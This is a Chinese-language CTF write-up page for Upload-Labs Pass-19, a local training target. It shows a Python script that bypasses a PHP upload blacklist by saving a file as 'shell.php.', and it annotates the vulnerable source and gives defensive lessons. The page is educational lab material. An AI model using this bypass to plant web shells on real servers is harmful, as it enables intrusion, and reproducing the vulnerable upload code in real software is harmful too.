@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Writeup: Upload-Labs Pass-19 - Y11516</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0e17; background-image: radial-gradient(circle at 50% 20%, rgba(0, 240, 255, 0.05) 0%, transparent 50%); font-family: 'Inter', sans-serif; color: #ccd6f6; padding: 6rem 1rem 4rem 1rem; display: flex; justify-content: center; line-height: 1.8; }
+        .navbar { position: fixed; top: 0; left: 0; width: 100%; padding: 1.2rem 5%; display: flex; justify-content: space-between; align-items: center; background: rgba(10, 14, 23, 0.7); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(0, 240, 255, 0.15); z-index: 999; }
+        .logo { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 1.2rem; color: #00f0ff; letter-spacing: 2px; }
+        .nav-links a { color: #8892b0; text-decoration: none; margin-left: 2rem; font-size: 0.9rem; transition: 0.3s; }
+        .nav-links a:hover { color: #00f0ff; }
+        .post-container { max-width: 820px; width: 100%; background: rgba(255,255,255,0.03); backdrop-filter: blur(6px); border: 1px solid rgba(255,255,255,0.06); border-radius: 32px; padding: 3rem; box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6); }
+        h1 { font-family: 'Orbitron', sans-serif; font-size: 2.2rem; margin-bottom: 0.5rem; color: #00f0ff; text-shadow: 0 0 15px rgba(0, 240, 255, 0.3); }
+        .date { color: #475569; font-size: 0.9rem; margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 1px solid rgba(0, 240, 255, 0.2); display: flex; gap: 15px; flex-wrap: wrap;}
+        .date span { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.8rem; border-radius: 12px; color: #00f0ff; font-size: 0.8rem; }
+        h2 { color: #a855f7; font-size: 1.4rem; margin: 2.5rem 0 1rem 0; border-left: 4px solid #a855f7; padding-left: 10px; }
+        h3 { color: #e2e8f0; font-size: 1.15rem; margin: 1.8rem 0 0.8rem 0; }
+        h4 { color: #c084fc; font-size: 1rem; margin: 1.2rem 0 0.6rem 0; }
+        p { margin-bottom: 1rem; color: #94a3b8; }
+        strong { color: #e2e8f0; }
+        code { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.4rem; border-radius: 4px; font-family: 'Courier New', monospace; color: #00f0ff; font-size: 0.95rem; }
+        pre { background: #0f172a; padding: 1rem; border-radius: 8px; overflow-x: auto; border: 1px solid #1e293b; margin-bottom: 1rem; }
+        pre code { background: transparent; padding: 0; color: #e2e8f0; }
+        ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; color: #94a3b8; }
+        li { margin-bottom: 0.5rem; }
+        .highlight-box { background: rgba(168, 85, 247, 0.05); border: 1px solid rgba(168, 85, 247, 0.2); border-radius: 12px; padding: 1.5rem; margin-bottom: 1rem; }
+        .note-box { background: rgba(0, 240, 255, 0.05); border-left: 3px solid #00f0ff; padding: 1rem; margin-bottom: 1rem; border-radius: 0 8px 8px 0; }
+        .action-bar { display: flex; justify-content: center; gap: 1.5rem; margin-top: 3rem; flex-wrap: wrap; }
+        .action-link { color: #00f0ff; text-decoration: none; border: 1px solid #00f0ff; padding: 10px 24px; border-radius: 30px; transition: 0.3s; }
+        .action-link:hover { background: rgba(0, 240, 255, 0.1); }
+        .action-link.secondary { color: #8892b0; border-color: #475569; }
+        @media (max-width: 640px) { .post-container { padding: 1.5rem; } h1 { font-size: 1.5rem; } .action-bar { flex-direction: column; } }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="logo"><i class="fas fa-shield-halved"></i> Y11516</div>
+        <div class="nav-links">
+            <a href="/ctf.html"><i class="fas fa-bug"></i> CTF 总库</a>
+            <a href="/"><i class="fas fa-house"></i> 主页</a>
+        </div>
+    </nav>
+
+    <div class="post-container">
+        <h1><i class="fas fa-upload"></i> Upload-Labs Pass-19</h1>
+        <div class="date">
+            <span><i class="far fa-calendar-alt"></i> 2026年9月27日</span>
+            <span><i class="fas fa-tag"></i> Upload-Labs</span>
+            <span><i class="fas fa-tag"></i> Web安全</span>
+            <span><i class="fas fa-tag"></i> 文件上传</span>
+            <span><i class="fas fa-tag"></i> 代码审计</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>Upload-Labs Pass-19 (pathinfo 逻辑绕过)</li>
+            <li><strong>题目平台：</strong>Upload-Labs 本地靶场</li>
+            <li><strong>题目类型：</strong>Web安全 / 文件上传漏洞 / 黑名单绕过 / 代码审计</li>
+            <li><strong>靶场链接：</strong>http://localhost:8082/Pass-19/index.php（本地环境）</li>
+            <li><strong>涉及工具：</strong>Python (requests库)</li>
+        </ul>
+
+        <h2>二、解题步骤</h2>
+        
+        <h3>1. 分析题目考什么</h3>
+        <p>本题的核心考点是<strong>代码审计与函数逻辑漏洞</strong>。后端使用 <code>pathinfo()</code> 函数来获取文件后缀。通过审计源码可以发现，文件名完全由 POST 参数 <code>save_name</code> 控制，且该函数在处理末尾带点号的文件名（如 <code>shell.php.</code>）时，会返回空字符串 <code>""</code>，导致黑名单检测失效，最终文件被原样保存。</p>
+
+        <h3>2. 怎么想（破题思路）</h3>
+        <ul>
+            <li>查看源码，发现 <code>save_name</code> 参数完全可控，并且路径拼接时直接使用了该参数。</li>
+            <li>构造文件名 <code>shell.php.</code>（末尾加点），利用 <code>pathinfo</code> 的解析逻辑绕过黑名单。</li>
+            <li>配合图片马 <code>shell.jpg</code> 绕过可能存在的图片内容检测。</li>
+        </ul>
+
+        <h3>3. 怎么解（详细步骤与踩坑记录）</h3>
+        
+        <div class="note-box">
+            <h4><i class="fas fa-exclamation-triangle"></i> 踩坑记录一：Mac 环境无法解析 .php. 后缀</h4>
+            <p><strong>踩坑情况：</strong>文件上传成功后，访问 <code>shell.php.</code> 时页面没有执行 PHP，而是显示了源码或 404。</p>
+            <p><strong>原因分析：</strong>Mac 和 Linux 下的 PHP 解析器默认不认识以点号结尾的文件。但这不影响靶场通关逻辑，只要文件落地成功即视为绕过成功。</p>
+            <p><strong>改进方式：</strong>在真实渗透中，如果目标环境是 Windows（IIS 或 Apache），<code>.php.</code> 会被作为 PHP 脚本解析。在本靶场，看到“上传成功”和 <code>../upload/shell.php.</code> 路径即可通关。</p>
+        </div>
+
+        <div class="highlight-box">
+            <h4><i class="fas fa-terminal"></i> 详细实操步骤（Payload逐字解释）</h4>
+            
+            <p><strong>第一步：编写 Python 脚本</strong></p>
+            <pre><code>import requests
+import re
+
+url = "http://localhost:8082/Pass-19/index.php"
+
+# 核心作弊点：save_name 参数末尾加一个点号
+# 绕过 pathinfo 解析，让 file_ext 变成空字符串
+data = {
+    'save_name': 'shell.php.',  # 关键
+    'submit': 'Submit'
+}
+
+files = {
+    'upload_file': ('shell.jpg', open('shell.php', 'rb'), 'image/jpeg')
+}
+
+response = requests.post(url, files=files, data=data)
+print(response.text)
+
+match = re.search(r'\.\./upload/(\S+)"', response.text)
+if match:
+    print(f"\n[+] 上传成功！真实文件路径为: /upload/{match.group(1)}")</code></pre>
+            <p><strong>逐字解析：</strong></p>
+            <ul>
+                <li><code>save_name='shell.php.'</code>：利用末尾点号欺骗 <code>pathinfo()</code>，绕过黑名单。</li>
+                <li><code>'shell.jpg'</code>：上传的伪装文件，用于通过图片内容检测。</li>
+            </ul>
+
+            <p><strong>第二步：验证</strong></p>
+            <p>运行脚本后，终端输出 <code>[+] 上传成功！真实文件路径为: /upload/shell.php.</code>，证明逻辑绕过成功。</p>
+        </div>
+
+        <h3>4. 怎么迁移（跨领域联想）</h3>
+        <ul>
+            <li><strong>代码审计的重要性：</strong>Pass-19 完全是一道“源码阅读题”。不审计源码，你根本不知道 <code>pathinfo</code> 会被点号欺骗。在真实的代码审计中，要特别留意字符串处理函数（如 <code>pathinfo</code>、<code>basename</code>、<code>explode</code>）的边界情况。</li>
+            <li><strong>黑名单的终结：</strong>从 Pass-03 到 Pass-19，黑名单被各种方式绕过（大小写、空格、点号、双写、数据流）。这再次证明：白名单+文件重命名+服务器权限控制才是终极解决方案。</li>
+            <li><strong>环境差异与靶场评分：</strong>Mac 环境不能解析 <code>.php.</code> 属于环境限制，不影响靶场的评分逻辑。在靶场中，绕过检测就是胜利。</li>
+        </ul>
+
+        <h2>三、源码逐行深度解读（核心复盘）</h2>
+        
+        <div class="highlight-box">
+            <h4><i class="fas fa-code"></i> 源码逻辑逐行解析</h4>
+            <p>我们将后端代码逐行拆解，找出漏洞发生的根本原因：</p>
+            <pre><code>1.  $is_upload = false;
+2.  $msg = null;
+3.  if (isset($_POST['submit'])) {
+4.      if (file_exists(UPLOAD_PATH)) {
+5.          $deny_ext = array("php", "php5", "php4", "php3", "php2", "html", "htm", "phtml", "pht", ...); // 黑名单
+6.          
+7.          $file_name = $_POST['save_name']; // 漏洞点1：文件名完全可控
+8.          $file_ext = pathinfo($file_name, PATHINFO_EXTENSION); // 漏洞点2：解析缺陷
+9.          
+10.         if (!in_array($file_ext, $deny_ext)) { // 漏洞点3：黑名单绕过
+11.             $temp_file = $_FILES['upload_file']['tmp_name'];
+12.             $img_path = UPLOAD_PATH . '/' . $file_name; // 漏洞点4：原样保存
+13.             if (move_uploaded_file($temp_file, $img_path)) {
+14.                 $is_upload = true;
+15.             } else {
+16.                 $msg = '上传出错！';
+17.             }
+18.         } else {
+19.             $msg = '禁止保存为该类型文件！';
+20.         }
+21.     } else {
+22.         $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+23.     }
+24. }</code></pre>
+
+            <p><strong>漏洞点详解：</strong></p>
+            <ul>
+                <li><strong>第7行</strong>：后端没有对 <code>$_POST['save_name']</code> 进行任何过滤，直接接收用户输入作为文件名。</li>
+                <li><strong>第8行（核心漏洞）</strong>：<code>pathinfo('shell.php.', PATHINFO_EXTENSION)</code> 的结果是空字符串 <code>""</code>。因为 <code>pathinfo</code> 在处理时，认为最后一个点后面是空的，所以返回了空后缀。</li>
+                <li><strong>第10行</strong>：<code>in_array("", $deny_ext)</code> 返回 <code>false</code>。空字符串不在黑名单里，条件成立，绕过成功。</li>
+                <li><strong>第12行</strong>：拼接路径时使用了原始文件名 <code>shell.php.</code>，最终文件被成功保存为 <code>shell.php.</code>。</li>
+            </ul>
+        </div>
+
+        <h2>四、题目思考</h2>
+        
+        <h3>1. 这跟前面的题有什么区别？</h3>
+        <ul>
+            <li><strong>与 Pass-14 的区别：</strong>Pass-14 利用图片文件头检测漏洞（内容级）。Pass-19 利用 <code>pathinfo</code> 函数的解析逻辑缺陷（文件名级）。</li>
+            <li><strong>与 Pass-10 的区别：</strong>Pass-10 是双写绕过（替换逻辑漏洞）。Pass-19 是利用函数对特殊字符的处理逻辑。</li>
+        </ul>
+
+        <h3>2. 这种题目的出现原因（为什么存在）</h3>
+        <p>开发者试图通过 <code>pathinfo</code> 来提取后缀，然后扔进黑名单。但他们没有考虑到 <code>pathinfo</code> 处理异常文件名（末尾带点）时的行为。这警示我们：安全防御不能依赖函数的默认行为，必须进行严格的输入规范化处理。</p>
+
+        <h3>3. 这种应用在实际中如何体现？</h3>
+        <p>在实战中，如果遇到文件上传结合文件包含漏洞（LFI），攻击者甚至可以上传 <code>shell.php.</code> 再利用 LFI 包含它。防御方应使用白名单，并在保存文件时对文件名进行重命名。</p>
+
+        <h3>4. 如何抽象理解概念（大白话）</h3>
+        <div class="highlight-box">
+            <p><strong>把靶场比作一个“查岗的门卫”：</strong></p>
+            <ul>
+                <li>Pass-19 的门卫只检查你的后缀是不是“刀（.php）”。</li>
+                <li>你把名字写成“刀（.php.）”，门卫用他的识字卡（pathinfo）一查，卡上显示“无后缀”，于是放行。</li>
+                <li>但实际上，你的刀还在身上，只是名字多带了个标点符号而已。</li>
+            </ul>
+        </div>
+
+        <p style="margin-top: 2rem; text-align: center; color: #475569;"><i class="fas fa-code"></i> 做一道题，就要往自己脑子里装点东西。</p>
+
+        <div class="action-bar">
+            <a href="/ctf.html" class="action-link"><i class="fas fa-arrow-left"></i> 返回 CTF 总库</a>
+            <a href="/" class="action-link secondary"><i class="fas fa-house"></i> 返回主页</a>
+        </div>
+    </div>
+</body>
+</html>
